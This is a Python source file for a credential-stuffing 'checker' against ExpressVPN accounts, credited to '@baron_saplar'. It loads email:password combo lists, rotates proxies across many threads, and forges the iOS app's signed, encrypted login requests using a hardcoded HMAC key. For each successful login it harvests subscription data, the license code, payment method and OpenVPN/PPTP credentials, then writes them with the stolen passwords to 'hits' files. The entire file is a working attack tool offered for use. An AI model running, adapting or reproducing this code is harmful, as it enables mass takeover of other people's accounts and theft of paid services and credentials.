
import os
import sys
import json
import base64
import gzip
import hmac
import hashlib
import random
import string
import re
import time
import threading
import concurrent.futures
import urllib3
from datetime import datetime
from typing import Dict, List, Optional, Any

import requests
import colorama
from colorama import Fore, Style
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography import x509 as crypto_x509
from asn1crypto import cms, algos, core, x509
import webbrowser 
webbrowser.open("t.me/BaronSec2")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init()

#@baron_saplar
class AesCryptographyService:

    
    def decrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(data) + decryptor.finalize()
        
        unpadder = PKCS7(128).unpadder()
        unpadded = unpadder.update(decrypted) + unpadder.finalize()
        return unpadded
    
    def encrypt(self, data: bytes, key: bytes, iv: bytes) -> bytes:
        padder = PKCS7(128).padder()
        padded = padder.update(data) + padder.finalize()
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        return encryptor.update(padded) + encryptor.finalize()
#@baron_saplar

class CryptoHelper:
   
    
    @staticmethod
    def get_byte_array(size: int) -> bytes:
        return os.urandom(size)
    
    @staticmethod
    def compute_signature(data: bytes, key: bytes) -> str:
        return base64.b64encode(
            hmac.new(key, data, hashlib.sha1).digest()
        ).decode('ascii')
    
    @staticmethod
    def gzip_data(input_str: str) -> bytes:
        input_bytes = input_str.encode('ascii')
        return gzip.compress(input_bytes, compresslevel=9)
    
    @staticmethod
    def envelope_encrypt(data: bytes, cert_base64: str) -> bytes:
        cert_der = base64.b64decode(cert_base64)
        cert = x509.Certificate.load(cert_der)
        
        aes_key = os.urandom(16)
        iv = os.urandom(16)
        
        aes_service = AesCryptographyService()
        encrypted_content = aes_service.encrypt(data, aes_key, iv)
        
        crypto_cert = crypto_x509.load_der_x509_certificate(cert_der)
        public_key = crypto_cert.public_key()
        
        encrypted_key = public_key.encrypt(
            aes_key,
            asym_padding.PKCS1v15()
        )
        
        recipient_info = cms.RecipientInfo({
            'ktri': cms.KeyTransRecipientInfo({
                'version': cms.CMSVersion(0),
                'rid': cms.RecipientIdentifier({
                    'issuer_and_serial_number': cms.IssuerAndSerialNumber({
                        'issuer': cert['tbs_certificate']['issuer'],
                        'serial_number': cert['tbs_certificate']['serial_number']
                    })
                }),
                'key_encryption_algorithm': cms.KeyEncryptionAlgorithm({
                    'algorithm': '1.2.840.113549.1.1.1',
                    'parameters': core.Null()
                }),
                'encrypted_key': encrypted_key
            })
        })
        
        enveloped_data = cms.EnvelopedData({
            'version': cms.CMSVersion(0),
            'recipient_infos': cms.RecipientInfos([recipient_info]),
            'encrypted_content_info': cms.EncryptedContentInfo({
                'content_type': '1.2.840.113549.1.7.1',
                'content_encryption_algorithm': cms.EncryptionAlgorithm({
                    'algorithm': '2.16.840.1.101.3.4.1.2',
                    'parameters': iv
                }),
                'encrypted_content': encrypted_content
            })
        })
        
        content_info = cms.ContentInfo({
            'content_type': '1.2.840.113549.1.7.3',
            'content': enveloped_data
        })
        
        return content_info.dump()


class ProxyManager:

    #@baron_saplar
    def __init__(self, proxy_list: List[str]):
        self.proxies = proxy_list
        self.current_index = 0
    
    def get_proxy(self) -> Optional[Dict[str, str]]:
        if not self.proxies:
            return None
        
        proxy_str = self.proxies[self.current_index % len(self.proxies)]
        self.current_index += 1
        return self._parse_proxy(proxy_str)
    
    def _parse_proxy(self, proxy_str: str) -> Dict[str, str]:
        proxy_str = proxy_str.strip()
        
        if '://' in proxy_str:
            return {'http': proxy_str, 'https': proxy_str}
        
        if proxy_str.count(':') >= 3:
            parts = proxy_str.split(':', 3)
            if len(parts) == 4:
                host, port, user, pwd = parts
                proxy_url = f'http://{user}:{pwd}@{host}:{port}'
                return {'http': proxy_url, 'https': proxy_url}
        
        if '@' in proxy_str and ':' in proxy_str:
            if proxy_str.count('@') == 1:
                auth, host_port = proxy_str.split('@', 1)
                if ':' in auth and ':' in host_port:
                    user, pwd = auth.split(':', 1)
                    host, port = host_port.rsplit(':', 1)
                    proxy_url = f'http://{user}:{pwd}@{host}:{port}'
                    return {'http': proxy_url, 'https': proxy_url}
        
        if proxy_str.count(':') == 1:
            host, port = proxy_str.split(':')
            proxy_url = f'http://{host}:{port}'
            return {'http': proxy_url, 'https': proxy_url}
        
        return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}


class ExpressVPNChecker:

    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
        
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        self.crypto = AesCryptographyService()
    
    def _get_session(self):
   
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2'
        })
        return session
    
    def generate_install_id(self) -> str:
        """Random 64 char lowercase/digits"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(64))
    
    def check_account(self, email: str, password: str) -> Dict[str, Any]:
        result = {
            'email': email,
            'password': password,
            'status': 'FAIL',
            'data': {}
        }
        
        try:
            iv = CryptoHelper.get_byte_array(16)
            key = CryptoHelper.get_byte_array(16)
            base64_iv = base64.b64encode(iv).decode('ascii')
            base64_key = base64.b64encode(key).decode('ascii')
            
            install_id = self.generate_install_id()
            
            post_data_dict = {
                "email": email,
                "iv": base64_iv,
                "key": base64_key,
                "password": password
            }
            post_data = json.dumps(post_data_dict)
            
            gzipped = CryptoHelper.gzip_data(post_data)
            encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)
            
            header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            header_signature = CryptoHelper.compute_signature(
                header_raw.encode('ascii'), 
                self.hmac_key.encode('ascii')
            )
            post_signature = CryptoHelper.compute_signature(
                encrypted_post, 
                self.hmac_key.encode('ascii')
            )
            
            proxies = self.proxy_manager.get_proxy() if self.proxy_manager else None
            
            session = self._get_session()
            
            url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
                'Expect': '',
                'Content-Type': 'application/octet-stream',
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {header_signature} 91c776e',
                'X-Body-Signature': f'2 {post_signature} 91c776e',
                'Accept-Language': 'en',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            response = session.post(
                url, 
                data=encrypted_post, 
                headers=headers, 
                proxies=proxies,
                timeout=15,
                verify=False
            )
            
            if response.status_code == 401 or response.status_code == 400:
                result['status'] = 'INVALID'
                return result
            elif response.status_code == 500:
                result['status'] = 'BAN'
                return result
            elif response.status_code != 200:
                result['status'] = 'ERROR'
                result['error'] = f'HTTP {response.status_code}'
                return result
            
            try:
                decrypted = self.crypto.decrypt(
                    response.content,
                    base64.b64decode(base64_key),
                    base64.b64decode(base64_iv)
                )
                response_body = decrypted.decode('utf-8', errors='ignore')
            except Exception as e:
                result['status'] = 'ERROR'
                result['error'] = f'Decryption failed'
                return result
            
            try:
                access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
                ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
                ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
                pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
                pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)
            except:
                result['status'] = 'ERROR'
                result['error'] = 'Failed to parse tokens'
                return result
            
            sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
            sub_signature = CryptoHelper.compute_signature(
                sub_raw.encode('ascii'),
                self.hmac_key.encode('ascii')
            )
            
            batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_signature = CryptoHelper.compute_signature(
                batch_raw.encode('ascii'),
                self.hmac_key.encode('ascii')
            )
            
            capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
            capture_signature = CryptoHelper.compute_signature(
                capture_body.encode('ascii'),
                self.hmac_key.encode('ascii')
            )
            
            batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
            batch_headers = {
                'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
                'X-Body-Compression': 'gzip',
                'X-Signature': f'2 {batch_signature} 91c776e',
                'X-Body-Signature': f'2 {capture_signature} 91c776e',
                'Accept-Language': 'en',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            batch_response = session.post(
                batch_url,
                data=capture_body,
                headers=batch_headers,
                proxies=proxies,
                timeout=15,
                verify=False
            )
            
            if 'subscription' not in batch_response.text or 'REVOKED' in batch_response.text or 'status\\\":\\\"\\\"' in batch_response.text:
                result['status'] = 'EXPIRED'
                return result
            
            unescaped = batch_response.text.encode().decode('unicode_escape')
            
            plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
            plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
            
            auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
            auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
            
            exp_match = re.search(r'expiration_time":(\d+)', unescaped)
            expiration = int(exp_match.group(1)) if exp_match else 0
            
            current_time = int(time.time())
            days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
            expire_date = datetime.fromtimestamp(expiration).strftime('%Y-%m-%d') if expiration else 'N/A'
            
            payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
            payment = payment_match.group(1) if payment_match else "Unknown"
            
            web_headers = {
                'Host': 'www.expressvpn.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Referer': 'https://portal.expressvpn.com/my-subscriptions',
                'authorization': f'Bearer {access_token}',
                'content-type': 'application/json',
                'x-tenant': 'xvpn',
                'Origin': 'https://portal.expressvpn.com',
                'Connection': 'keep-alive'
            }
            #@baron_saplar
            try:
                web_resp = session.get(
                    'https://www.expressvpn.com/api/v2/subscriptions',
                    headers=web_headers,
                    proxies=proxies,
                    timeout=15,
                    verify=False
                )
                licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
                license_code = licenses[-1] if licenses else "N/A"
            except:
                license_code = "N/A"
            
            session.close()
            
            result['status'] = 'HIT'
            result['data'] = {
                'plan': plan,
                'auto_renew': auto_renew == 'true',
                'expire_date': expire_date,
                'days_left': days_left,
                'payment_method': payment,
                'license': license_code,
                'ovpn_user': ovpn_user,
                'ovpn_pass': ovpn_pass,
                'pptp_user': pptp_user,
                'pptp_pass': pptp_pass
            }
            
        except Exception as e:
            result['status'] = 'ERROR'
            result['error'] = str(e)
        
        return result
    
    def save_result(self, result: Dict, output_dir: str = "results"):
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        timestamp = datetime.now().strftime('%Y-%m-%d')
        
        if result['status'] == 'HIT':
            filename = f"{output_dir}/hits_{timestamp}.txt"
            with open(filename, 'a', encoding='utf-8') as f:
                data = result['data']
                f.write(f"{result['email']}:{result['password']}\n")
                f.write(f"Plan: {data.get('plan')}\n")
                f.write(f"Expires: {data.get('expire_date')} ({data.get('days_left')} days)\n")
                f.write(f"License: {data.get('license')}\n")
                f.write(f"Payment: {data.get('payment_method')}\n")
                f.write(f"AutoRenew: {data.get('auto_renew')}\n")
                f.write(f"OVPN: {data.get('ovpn_user')}:{data.get('ovpn_pass')}\n")
                f.write(f"PPTP: {data.get('pptp_user')}:{data.get('pptp_pass')}\n")
                f.write("\n")
        
        elif result['status'] == 'INVALID':
            filename = f"{output_dir}/invalid_{timestamp}.txt"
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        
        elif result['status'] == 'EXPIRED':
            filename = f"{output_dir}/expired_{timestamp}.txt"
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        
        elif result['status'] == 'ERROR':
            filename = f"{output_dir}/errors_{timestamp}.txt"
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']} | {result.get('error', 'Unknown')}\n")



def print_banner():
    print(f"""{Fore.CYAN}

       ExpressVPN Checker - Baron       
       

{Style.RESET_ALL}""")


def get_file_path(file_type: str, default_name: str) -> Optional[str]:
    if os.path.exists(default_name):
        choice = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} {default_name} found. Use it? (y/n): ").strip().lower()
        if choice == 'y':
            return default_name
    
    path = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Enter {file_type} file path: ").strip()
    
    if not path:
        return None
    
    if not os.path.exists(path):
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File not found: {path}")
        return None
    
    return path


def main():
    print_banner()
    
    combo_file = get_file_path("combo", "combo.txt")
    if not combo_file:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Combo file required!")
        sys.exit(1)
    
    combos = []
    try:
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        combos.append((parts[0], parts[1]))
        print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Loaded {len(combos)} combos from {combo_file}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to load combo: {e}")
        sys.exit(1)
    
    proxy_manager = None
    proxy_file = get_file_path("proxy", "proxy.txt")
    
    if proxy_file:
        try:
            with open(proxy_file, 'r') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            proxy_manager = ProxyManager(proxy_list)
            print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Loaded {len(proxy_list)} proxies from {proxy_file}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Failed to load proxies: {e}")
    else:
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} No proxy file - running without proxies")
    
    try:
        thread_input = input(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Thread count (1-50, default 5): ").strip()
        threads = int(thread_input) if thread_input else 5
        threads = max(1, min(50, threads))
    except:
        threads = 5
    
    print(f"{Fore.GREEN}[✓]{Style.RESET_ALL} Using {threads} threads\n")
    
    checker = ExpressVPNChecker(proxy_manager=proxy_manager)
    
    stats = {'checked': 0, 'hits': 0, 'invalid': 0, 'expired': 0, 'errors': 0}
    lock = threading.Lock()
    
    def check_wrapper(email_pass):
        email, password = email_pass
        result = checker.check_account(email, password)
        
        with lock:
            stats['checked'] += 1
            
            if result['status'] == 'HIT':
                stats['hits'] += 1
                data = result['data']
                print(f"{Fore.GREEN}[HIT]{Style.RESET_ALL} {email}")
                print(f"  Plan: {data.get('plan')} | Expires: {data.get('expire_date')} ({data.get('days_left')} days)")
                print(f"  License: {data.get('license')}")
            
            elif result['status'] == 'INVALID':
                stats['invalid'] += 1
                print(f"{Fore.RED}[INVALID]{Style.RESET_ALL} {email}")
            
            elif result['status'] == 'EXPIRED':
                stats['expired'] += 1
                print(f"{Fore.YELLOW}[EXPIRED]{Style.RESET_ALL} {email}")
            
            elif result['status'] == 'ERROR':
                stats['errors'] += 1
                print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} {email}")
            
            checker.save_result(result)
            
            if stats['checked'] % 10 == 0:
                print(f"\n{Fore.CYAN}[STATS]{Style.RESET_ALL} Checked: {stats['checked']}/{len(combos)} | "
                      f"Hits: {stats['hits']} | Invalid: {stats['invalid']} | "
                      f"Expired: {stats['expired']} | Errors: {stats['errors']}\n")
    
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[START]{Style.RESET_ALL} Checking {len(combos)} accounts...\n")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_wrapper, combos)
    
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[COMPLETE]{Style.RESET_ALL}")
    print(f"Total Checked: {stats['checked']}")
    print(f"Hits: {Fore.GREEN}{stats['hits']}{Style.RESET_ALL}")
    print(f"Invalid: {Fore.RED}{stats['invalid']}{Style.RESET_ALL}")
    print(f"Expired: {Fore.YELLOW}{stats['expired']}{Style.RESET_ALL}")
    print(f"Errors: {Fore.MAGENTA}{stats['errors']}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}Cracked By: @baron_saplar{Style.RESET_ALL}\n")


if __name__ == "__main__":
    main()
